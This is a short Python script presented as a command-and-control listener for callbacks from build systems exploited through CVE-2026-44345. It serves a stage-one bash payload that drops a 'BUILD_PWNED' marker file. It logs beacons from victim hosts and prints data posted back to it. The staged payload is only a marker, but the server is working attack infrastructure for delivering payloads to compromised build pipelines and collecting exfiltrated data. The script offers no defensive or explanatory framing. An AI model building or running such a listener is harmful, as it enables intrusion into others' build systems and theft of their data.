#!/usr/bin/env python3
'''C2 Listener for CVE-2026-44345 build-stage callbacks'''
import http.server
import socketserver

HTTP_PORT = 4443

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/stage1":
            payload = "#!/bin/bash\necho 'BUILD_PWNED_'$(date +%s) > /tmp/pwned.txt\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(payload.encode())
            print("[!] STAGE 1 PAYLOAD DELIVERED to " + self.client_address[0])
        elif self.path == "/beacon":
            self.send_response(200)
            self.end_headers()
            print("[+] BEACON from " + self.client_address[0])
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""
        print("[!] DATA RECEIVED from " + self.client_address[0])
        print("    " + body[:500].decode(errors='replace'))
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    with socketserver.TCPServer(("", HTTP_PORT), C2Handler) as httpd:
        print("[*] HTTP C2 on :" + str(HTTP_PORT))
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("[*] Shutting down")
